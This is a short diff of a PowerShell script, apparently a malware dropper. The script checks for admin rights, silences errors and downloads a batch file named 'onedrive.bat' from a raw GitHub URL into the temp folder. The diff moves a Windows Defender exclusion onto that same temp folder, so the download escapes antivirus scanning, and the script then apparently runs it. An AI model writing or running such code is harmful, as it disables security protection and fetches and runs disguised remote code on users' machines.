@@ -17,7 +17,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 $ErrorActionPreference = "SilentlyContinue"
 
-Add-MpPreference -ExclusionPath $env:USERPROFILE"
+Add-MpPreference -ExclusionPath $env:TEMP
 Start-Sleep 1
 $url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
 $file = "$env:TEMP\onedrive.bat"
@@ -30,4 +30,5 @@ if (Test-Path $file) {
 } else {
     Write-Host "Файлът не е изтеглен" -ForegroundColor Red
 }
+
 
